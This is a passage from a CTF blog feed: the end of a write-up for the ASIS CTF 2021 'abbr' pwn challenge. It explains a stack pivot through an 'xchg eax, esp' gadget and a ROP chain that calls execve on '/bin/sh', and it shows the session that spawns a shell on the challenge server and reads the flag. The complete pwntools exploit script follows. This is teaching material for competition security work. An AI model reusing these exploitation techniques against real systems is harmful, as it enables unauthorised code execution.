 RSP  0x7ffdef1b8220 ◂— 0x0
 RIP  0x402036 (main+190) ◂— call   rdx
</code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>

<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>

<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 10010: Done
/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="final-exploit">
        Final exploit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfinit</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;abbr&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
</span><span class="s1">b* 0x402036
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span>
<span class="c1"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span>

<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>

<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>

<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/ASIS-CTF" term="ASIS-CTF" label="ASIS CTF" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/oob-write" term="oob-write" label="oob write" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
</feed>
